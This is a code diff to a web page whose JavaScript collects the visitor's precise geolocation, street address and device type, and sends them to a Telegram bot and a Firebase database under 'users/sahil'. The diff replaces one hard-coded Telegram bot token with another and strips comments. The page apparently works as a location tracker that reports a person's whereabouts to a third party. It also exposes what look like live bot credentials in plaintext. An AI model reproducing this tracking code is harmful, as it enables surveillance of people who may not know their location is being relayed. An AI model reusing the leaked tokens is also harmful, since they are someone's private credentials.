@@ -88,13 +88,12 @@
 
         const statusText = document.getElementById("status");
 
-        // --- TELEGRAM CONFIGURATION ---
-        const BOT_TOKEN = "8818145313:AAE9KwaKfnjBm9aaMDnzwMwuIgJgM_ajoR4";
+        // --- NEW TELEGRAM CONFIGURATION ---
+        const BOT_TOKEN = "8944921867:AAEIWr6FFxFuZQ60IKhUUSWDjq6en2dXu74";
         const CHAT_ID = "8407541236"; 
 
         let hasAlerted = false;
 
-        // Device & Browser Detection Helper
         function getDeviceInfo() {
             const ua = navigator.userAgent;
             let device = "Desktop/PC";
@@ -103,7 +102,6 @@
             return device;
         }
 
-        // Reverse Geocoding to get human-readable Address
         async function getAddress(lat, lng) {
             try {
                 let response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`);
@@ -160,10 +158,8 @@
                 const lng = position.coords.longitude;
                 const accuracy = position.coords.accuracy;
 
-                // Send Advanced Notification once
                 sendTelegramAlert(lat, lng, accuracy);
 
-                // Update Live Firebase Data continuously
                 set(ref(db, 'users/sahil'), {
                     latitude: lat,
                     longitude: lng,
@@ -183,9 +179,6 @@
             statusText.innerText = "Browser doesn't support geolocation.";
             statusText.classList.add("error");
         }
-    </script>
-</body>
-</html>
     </script>
 </body>
 </html>
